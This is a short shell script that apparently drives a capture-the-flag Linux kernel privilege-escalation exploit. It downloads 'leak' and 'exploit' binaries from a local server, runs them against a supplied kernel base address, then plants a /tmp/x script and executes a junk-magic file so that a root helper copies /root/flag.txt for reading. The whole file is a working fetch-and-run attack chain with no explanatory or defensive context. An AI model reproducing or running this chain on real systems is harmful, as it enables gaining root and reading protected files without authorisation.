#!/bin/sh

FILE_URL=http://127.0.0.1:8000

wget $FILE_URL/leak -O /tmp/leak
wget $FILE_URL/exploit -O /tmp/exploit

chmod +x /tmp/leak /tmp/exploit

/tmp/leak
/tmp/exploit "0xabcdef12345678" # second arg should be kernel base addr

echo -ne "#!/bin/sh\ncat /root/flag.txt > /tmp/lol\n" > /tmp/x
echo -ne "\xFF\xFF\xFF\xFF" > /tmp/data
chmod +x /tmp/x /tmp/data
/tmp/data
cat /tmp/lol